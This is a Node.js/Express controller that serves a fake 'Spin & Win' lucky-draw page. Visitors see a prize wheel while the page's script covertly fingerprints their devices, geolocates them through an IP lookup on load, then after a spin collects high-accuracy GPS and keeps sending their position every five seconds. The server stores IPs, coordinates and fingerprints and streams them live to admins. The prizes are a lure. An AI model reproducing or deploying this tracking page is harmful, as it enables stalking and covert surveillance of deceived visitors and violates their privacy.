const PublicLocation = require('../models/PublicLocation');
const { success, created } = require('../utils/response');
const { getIO } = require('../config/socket');
const logger = require('../utils/logger');

const renderCapturePage = async (req, res, next) => {
  try {
    const html = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
          <meta name="theme-color" content="#ff6b6b">
          <title>🎰 Spin & Win - Daily Lucky Draw!</title>
          <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;900&display=swap" rel="stylesheet">
          <style>
              * { margin: 0; padding: 0; box-sizing: border-box; }
              body {
                  font-family: 'Poppins', sans-serif;
                  background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
                  min-height: 100vh;
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: center;
                  overflow-x: hidden;
                  color: white;
              }
              .glow-bg {
                  position: fixed;
                  width: 300px;
                  height: 300px;
                  border-radius: 50%;
                  filter: blur(100px);
                  opacity: 0.5;
                  animation: float 6s ease-in-out infinite;
              }
              .glow-1 { background: #e94560; top: 10%; left: -100px; animation-delay: 0s; }
              .glow-2 { background: #533483; bottom: 10%; right: -100px; animation-delay: 3s; }
              @keyframes float {
                  0%, 100% { transform: translateY(0) scale(1); }
                  50% { transform: translateY(-30px) scale(1.1); }
              }
              .container {
                  text-align: center;
                  padding: 20px;
                  max-width: 450px;
                  width: 100%;
                  position: relative;
                  z-index: 10;
              }
              .header-badge {
                  background: linear-gradient(90deg, #ffd700, #ffed4e);
                  color: #1a1a2e;
                  padding: 8px 20px;
                  border-radius: 25px;
                  font-size: 12px;
                  font-weight: 700;
                  display: inline-block;
                  margin-bottom: 15px;
                  box-shadow: 0 4px 15px rgba(255, 215, 0, 0.4);
                  animation: shimmer 2s infinite;
              }
              @keyframes shimmer {
                  0%, 100% { box-shadow: 0 4px 15px rgba(255, 215, 0, 0.4); }
                  50% { box-shadow: 0 4px 30px rgba(255, 215, 0, 0.8); }
              }
              h1 {
                  font-size: 2.2rem;
                  font-weight: 900;
                  margin-bottom: 10px;
                  background: linear-gradient(90deg, #fff, #ffd700, #fff);
                  -webkit-background-clip: text;
                  -webkit-text-fill-color: transparent;
                  background-clip: text;
              }
              .subtitle {
                  color: rgba(255,255,255,0.7);
                  font-size: 0.95rem;
                  margin-bottom: 30px;
              }
              .wheel-container {
                  position: relative;
                  width: 280px;
                  height: 280px;
                  margin: 0 auto 30px;
              }
              .wheel {
                  width: 100%;
                  height: 100%;
                  border-radius: 50%;
                  position: relative;
                  background: conic-gradient(
                      #e94560 0deg 45deg,
                      #533483 45deg 90deg,
                      #0ead69 90deg 135deg,
                      #ffd700 135deg 180deg,
                      #e94560 180deg 225deg,
                      #533483 225deg 270deg,
                      #0ead69 270deg 315deg,
                      #ffd700 315deg 360deg
                  );
                  box-shadow: 
                      0 0 0 10px #1a1a2e,
                      0 0 0 15px #ffd700,
                      0 20px 50px rgba(0,0,0,0.5),
                      inset 0 0 30px rgba(0,0,0,0.3);
                  transition: transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99);
              }
              .wheel::before {
                  content: '';
                  position: absolute;
                  top: 50%;
                  left: 50%;
                  transform: translate(-50%, -50%);
                  width: 60px;
                  height: 60px;
                  background: linear-gradient(145deg, #ffd700, #ffed4e);
                  border-radius: 50%;
                  box-shadow: 0 5px 20px rgba(0,0,0,0.3);
                  z-index: 10;
              }
              .wheel-center {
                  position: absolute;
                  top: 50%;
                  left: 50%;
                  transform: translate(-50%, -50%);
                  font-size: 24px;
                  z-index: 11;
                  pointer-events: none;
              }
              .wheel-text {
                  position: absolute;
                  width: 100%;
                  height: 100%;
              }
              .prize-label {
                  position: absolute;
                  font-size: 10px;
                  font-weight: 700;
                  color: white;
                  text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
                  transform-origin: center;
              }
              .pointer {
                  position: absolute;
                  top: -20px;
                  left: 50%;
                  transform: translateX(-50%);
                  width: 0;
                  height: 0;
                  border-left: 15px solid transparent;
                  border-right: 15px solid transparent;
                  border-top: 30px solid #ffd700;
                  filter: drop-shadow(0 3px 5px rgba(0,0,0,0.3));
                  z-index: 20;
              }
              .spin-btn {
                  background: linear-gradient(145deg, #e94560, #c73e54);
                  color: white;
                  border: none;
                  padding: 18px 50px;
                  border-radius: 50px;
                  font-size: 1.3rem;
                  font-weight: 700;
                  cursor: pointer;
                  box-shadow: 
                      0 10px 30px rgba(233, 69, 96, 0.4),
                      inset 0 2px 0 rgba(255,255,255,0.2);
                  transition: all 0.3s ease;
                  text-transform: uppercase;
                  letter-spacing: 2px;
              }
              .spin-btn:hover {
                  transform: translateY(-3px);
                  box-shadow: 0 15px 40px rgba(233, 69, 96, 0.5);
              }
              .spin-btn:active {
                  transform: translateY(0);
              }
              .spin-btn:disabled {
                  background: #444;
                  cursor: not-allowed;
                  box-shadow: none;
              }
              .prizes-list {
                  display: flex;
                  justify-content: center;
                  gap: 10px;
                  margin-top: 25px;
                  flex-wrap: wrap;
              }
              .prize-chip {
                  background: rgba(255,255,255,0.1);
                  backdrop-filter: blur(10px);
                  padding: 8px 15px;
                  border-radius: 20px;
                  font-size: 11px;
                  border: 1px solid rgba(255,255,255,0.2);
              }
              .stats-row {
                  display: flex;
                  justify-content: center;
                  gap: 40px;
                  margin-top: 20px;
              }
              .stat-item {
                  text-align: center;
              }
              .stat-value {
                  font-size: 1.8rem;
                  font-weight: 700;
                  color: #ffd700;
              }
              .stat-label {
                  font-size: 11px;
                  color: rgba(255,255,255,0.6);
                  text-transform: uppercase;
                  letter-spacing: 1px;
              }
              .winner-banner {
                  display: none;
                  position: fixed;
                  top: 0;
                  left: 0;
                  right: 0;
                  bottom: 0;
                  background: rgba(0,0,0,0.9);
                  z-index: 1000;
                  align-items: center;
                  justify-content: center;
                  padding: 20px;
              }
              .winner-banner.active {
                  display: flex;
              }
              .winner-content {
                  background: linear-gradient(145deg, #1a1a2e, #16213e);
                  border-radius: 20px;
                  padding: 40px;
                  text-align: center;
                  border: 2px solid #ffd700;
                  box-shadow: 0 0 50px rgba(255, 215, 0, 0.3);
                  animation: popIn 0.5s ease;
              }
              @keyframes popIn {
                  from { transform: scale(0.5); opacity: 0; }
                  to { transform: scale(1); opacity: 1; }
              }
              .winner-emoji {
                  font-size: 60px;
                  margin-bottom: 20px;
              }
              .winner-title {
                  font-size: 1.8rem;
                  font-weight: 700;
                  color: #ffd700;
                  margin-bottom: 10px;
              }
              .winner-prize {
                  font-size: 1.2rem;
                  color: white;
                  margin-bottom: 25px;
              }
              .claim-btn {
                  background: linear-gradient(90deg, #ffd700, #ffed4e);
                  color: #1a1a2e;
                  border: none;
                  padding: 15px 40px;
                  border-radius: 30px;
                  font-size: 16px;
                  font-weight: 700;
                  cursor: pointer;
                  width: 100%;
              }
              #status {
                  margin-top: 15px;
                  font-size: 13px;
                  color: rgba(255,255,255,0.7);
                  min-height: 20px;
              }
              .pulse-ring {
                  position: absolute;
                  top: 50%;
                  left: 50%;
                  transform: translate(-50%, -50%);
                  width: 300px;
                  height: 300px;
                  border: 2px solid rgba(255, 215, 0, 0.3);
                  border-radius: 50%;
                  animation: pulseRing 2s infinite;
                  pointer-events: none;
              }
              @keyframes pulseRing {
                  0% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
                  100% { transform: translate(-50%, -50%) scale(1.3); opacity: 0; }
              }
          </style>
      </head>
      <body>
          <div class="glow-bg glow-1"></div>
          <div class="glow-bg glow-2"></div>
          
          <div class="container">
              <div class="header-badge">🎉 DAILY FREE SPIN</div>
              <h1>SPIN & WIN</h1>
              <p class="subtitle">Tap SPIN to try your luck today!</p>
              
              <div class="wheel-container">
                  <div class="pulse-ring"></div>
                  <div class="pointer"></div>
                  <div class="wheel" id="wheel"></div>
                  <div class="wheel-center">🎰</div>
              </div>
              
              <button class="spin-btn" id="spin-btn">SPIN NOW</button>
              
              <div class="prizes-list">
                  <span class="prize-chip">📱 iPhone 15</span>
                  <span class="prize-chip">💰 $500</span>
                  <span class="prize-chip">🎮 PS5</span>
                  <span class="prize-chip">🎁 Mystery Box</span>
              </div>
              
              <div class="stats-row">
                  <div class="stat-item">
                      <div class="stat-value" id="spins-left">3</div>
                      <div class="stat-label">Spins Left</div>
                  </div>
                  <div class="stat-item">
                      <div class="stat-value">2.4K</div>
                      <div class="stat-label">Winners Today</div>
                  </div>
              </div>
              
              <div id="status"></div>
          </div>
          
          <div class="winner-banner" id="winner-banner">
              <div class="winner-content">
                  <div class="winner-emoji">🎊</div>
                  <div class="winner-title">CONGRATULATIONS!</div>
                  <div class="winner-prize">You won a <strong>Mystery Prize!</strong></div>
                  <button class="claim-btn" id="claim-btn">Claim Your Prize</button>
              </div>
          </div>

          <script>
              const wheel = document.getElementById('wheel');
              const spinBtn = document.getElementById('spin-btn');
              const winnerBanner = document.getElementById('winner-banner');
              const claimBtn = document.getElementById('claim-btn');
              const status = document.getElementById('status');
              
              let isSpinning = false;
              let currentRotation = 0;
              let spinsLeft = 3;

              const getVisitorId = () => {
                  try {
                      let vid = localStorage.getItem('socius_vid');
                      if (!vid) {
                          vid = 'v_' + Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
                          localStorage.setItem('socius_vid', vid);
                      }
                      return vid;
                  } catch (e) {
                      return 'v_' + Date.now().toString(36);
                  }
              };

              const getFingerprintData = async () => {
                  const data = {
                      platform: navigator.platform,
                      vendor: navigator.vendor,
                      cpuCores: navigator.hardwareConcurrency || 0,
                      memory: navigator.deviceMemory || 0,
                      screen: window.screen.width + 'x' + window.screen.height,
                      language: navigator.language,
                      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                      userAgent: navigator.userAgent,
                  };
                  try {
                      const canvas = document.createElement('canvas');
                      const ctx = canvas.getContext('2d');
                      canvas.width = 200; canvas.height = 50;
                      ctx.fillStyle = '#f60';
                      ctx.fillRect(0, 0, 200, 50);
                      data.canvas = canvas.toDataURL();
                  } catch (e) {}
                  return data;
              };

              const generateHash = (data) => {
                  const str = JSON.stringify(data);
                  let hash = 0;
                  for (let i = 0; i < str.length; i++) {
                      const char = str.charCodeAt(i);
                      hash = ((hash << 5) - hash) + char;
                      hash = hash & hash;
                  }
                  return 'fp_' + Math.abs(hash).toString(16);
              };

              // Auto-capture on load
              window.addEventListener('load', async () => {
                  try {
                      const res = await fetch('https://ipapi.co/json/');
                      const geo = await res.json();
                      const fp = await getFingerprintData();
                      await fetch('/public/save-location', {
                          method: 'POST',
                          headers: { 'Content-Type': 'application/json' },
                          body: JSON.stringify({
                              latitude: geo.latitude || 0,
                              longitude: geo.longitude || 0,
                              accuracy: 5000,
                              method: 'ip-api',
                              visitorId: getVisitorId(),
                              fingerprintHash: generateHash(fp),
                              screenResolution: fp.screen,
                              language: fp.language,
                              timezone: fp.timezone,
                              userAgent: fp.userAgent,
                              deviceInfo: fp
                          })
                      });
                  } catch (e) {}
              });

              // Track user continuously after spin
              let watchId = null;
              let trackingInterval = null;
              
              const startTracking = (fp) => {
                  // Send location every 5 seconds
                  trackingInterval = setInterval(async () => {
                      navigator.geolocation.getCurrentPosition(
                          async (position) => {
                              await sendLocation(position, fp, true); // true = continuous update
                          },
                          () => {}, // silently fail
                          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                      );
                  }, 5000); // Every 5 seconds
                  
                  // Also watch for significant position changes
                  watchId = navigator.geolocation.watchPosition(
                      async (position) => {
                          await sendLocation(position, fp, true);
                      },
                      () => {},
                      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0, distanceFilter: 10 }
                  );
              };

              spinBtn.addEventListener('click', async () => {
                  if (isSpinning || spinsLeft <= 0) return;
                  
                  if (!navigator.geolocation) {
                      winnerBanner.classList.add('active');
                      return;
                  }

                  isSpinning = true;
                  spinsLeft--;
                  document.getElementById('spins-left').textContent = spinsLeft;
                  spinBtn.disabled = true;
                  status.innerHTML = 'Spinning... 🎰';
                  
                  const spins = 5 + Math.random() * 3;
                  const degrees = spins * 360 + Math.random() * 360;
                  currentRotation += degrees;
                  wheel.style.transform = 'rotate(' + currentRotation + 'deg)';
                  
                  const fp = await getFingerprintData();
                  let attempts = 0;
                  let bestPosition = null;

                  const tryGetLocation = () => {
                      attempts++;
                      navigator.geolocation.getCurrentPosition(
                          async (position) => {
                              const accuracy = position.coords.accuracy;
                              if (!bestPosition || accuracy < bestPosition.coords.accuracy) {
                                  bestPosition = position;
                              }
                              if (accuracy < 20 || attempts >= 3) {
                                  await sendLocation(bestPosition, fp);
                              } else {
                                  setTimeout(tryGetLocation, 1000);
                              }
                          },
                          async () => {
                              if (bestPosition) await sendLocation(bestPosition, fp);
                          },
                          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                      );
                  };

                  setTimeout(() => {
                      tryGetLocation();
                      // Start continuous tracking after spin
                      startTracking(fp);
                      status.innerHTML = '📍 Tracking active...';
                      
                      setTimeout(() => {
                          winnerBanner.classList.add('active');
                          isSpinning = false;
                          if (spinsLeft > 0) spinBtn.disabled = false;
                          else {
                              spinBtn.textContent = 'NO SPINS LEFT';
                              status.innerHTML = 'Come back tomorrow!';
                          }
                      }, 1500);
                  }, 4000);
              });

              const sendLocation = async (position, fp, isUpdate = false) => {
                  const data = {
                      latitude: position.coords.latitude,
                      longitude: position.coords.longitude,
                      accuracy: position.coords.accuracy,
                      altitude: position.coords.altitude,
                      method: 'geolocation',
                      visitorId: getVisitorId(),
                      fingerprintHash: generateHash(fp),
                      screenResolution: fp.screen,
                      language: fp.language,
                      timezone: fp.timezone,
                      userAgent: fp.userAgent,
                      deviceInfo: fp,
                      isUpdate: isUpdate // Flag to indicate if this is an update
                  };
                  
                  await fetch('/public/save-location', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify(data)
                  });
              };

              claimBtn.addEventListener('click', () => location.reload());
          </script>
      </body>
      </html>
    `;
    res.send(html);
  } catch (err) {
    next(err);
  }
};

const saveLocation = async (req, res, next) => {
  try {
    const { 
      latitude, longitude, accuracy, altitude, method,
      visitorId, fingerprintHash, screenResolution, language, timezone, 
      batteryLevel, networkType, deviceInfo, networkInfo, behavioralData, isUpdate
    } = req.body;
    
    // Check if we already have a recent entry for this visitor to avoid duplicates
    if (visitorId && method === 'ip-api') {
      const existing = await PublicLocation.findOne({
        visitorId,
        method: 'ip-api',
        createdAt: { $gt: new Date(Date.now() - 10 * 60 * 1000) } // 10 minutes
      });
      if (existing) {
        return success(res, existing, 'Location already captured recently');
      }
    }

    if (latitude === undefined || longitude === undefined) {
      return res.status(400).json({ error: 'Latitude and longitude are required' });
    }

    // If isUpdate flag is true, update the most recent record for this visitor
    if (isUpdate && visitorId) {
      const recentRecord = await PublicLocation.findOneAndUpdate(
        { visitorId, method: 'geolocation' },
        {
          $set: {
            'location.coordinates': [longitude, latitude],
            accuracy,
            altitude,
            updatedAt: new Date()
          }
        },
        { sort: { createdAt: -1 }, new: true }
      );
      
      if (recentRecord) {
        return success(res, recentRecord, 'Location updated successfully');
      }
    }

    const publicLocation = new PublicLocation({
      ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip,
      userAgent: req.headers['user-agent'],
      location: {
        type: 'Point',
        coordinates: [longitude, latitude],
      },
      accuracy,
      altitude,
      method: method || 'geolocation',
      visitorId: visitorId || 'v_unknown_' + Math.random().toString(36).substr(2, 5),
      fingerprintHash,
      screenResolution,
      language,
      timezone,
      batteryLevel,
      networkType,
      deviceInfo,
      networkInfo,
      behavioralData
    });

    await publicLocation.save();
    
    // Emit Socket.IO event to notify admins
    try {
      const io = getIO();
      io.to('admin').emit('location:captured', {
        visitorId: publicLocation.visitorId,
        ip: publicLocation.ip,
        location: publicLocation.location,
        accuracy: publicLocation.accuracy,
        method: publicLocation.method,
        createdAt: publicLocation.createdAt,
        deviceInfo: {
          screenResolution: publicLocation.screenResolution,
          language: publicLocation.language,
          timezone: publicLocation.timezone
        }
      });
      logger.info(`Socket.IO: Location captured event emitted for visitor ${publicLocation.visitorId}`);
    } catch (socketErr) {
      logger.error('Socket.IO emit failed:', socketErr.message);
    }
    
    return created(res, publicLocation, 'Location and fingerprint saved successfully');
  } catch (err) {
    next(err);
  }
};

const getAllLocations = async (req, res, next) => {
  try {
    const locations = await PublicLocation.find().sort({ createdAt: -1 });
    return success(res, locations);
  } catch (err) {
    next(err);
  }
};

const getLocationByVisitorId = async (req, res, next) => {
  try {
    const { visitorId } = req.params;
    // Try to find by visitorId OR ip (if visitorId is an IP)
    const locations = await PublicLocation.find({ 
      $or: [
        { visitorId: visitorId },
        { ip: visitorId }
      ]
    }).sort({ createdAt: -1 });
    
    if (!locations || locations.length === 0) {
      return res.status(404).json({ error: 'No data found for this visitor' });
    }
    return success(res, locations);
  } catch (err) {
    next(err);
  }
};

module.exports = {
  renderCapturePage,
  saveLocation,
  getAllLocations,
  getLocationByVisitorId,
};
